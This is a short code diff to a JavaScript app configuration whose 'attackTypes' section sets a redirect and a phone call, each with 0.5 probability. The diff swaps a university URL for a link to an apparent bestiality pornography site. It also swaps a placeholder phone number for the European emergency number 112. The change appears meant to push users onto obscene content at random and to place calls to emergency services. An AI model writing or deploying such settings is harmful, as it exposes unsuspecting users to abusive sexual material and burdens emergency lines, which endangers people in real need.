@@ -10,12 +10,12 @@ var appConfig = {
     attackTypes: {
         redirect: {
             probability: 0.5,
-            url: 'https://www.unizar.es/',
+            url: 'https://beastiality.tv/es/tag/goat-sex/',
             delay: 0
         },
         call: {
             probability: 0.5,
-            phoneNumber: '+34600000000'
+            phoneNumber: '112'
         }
     },
 
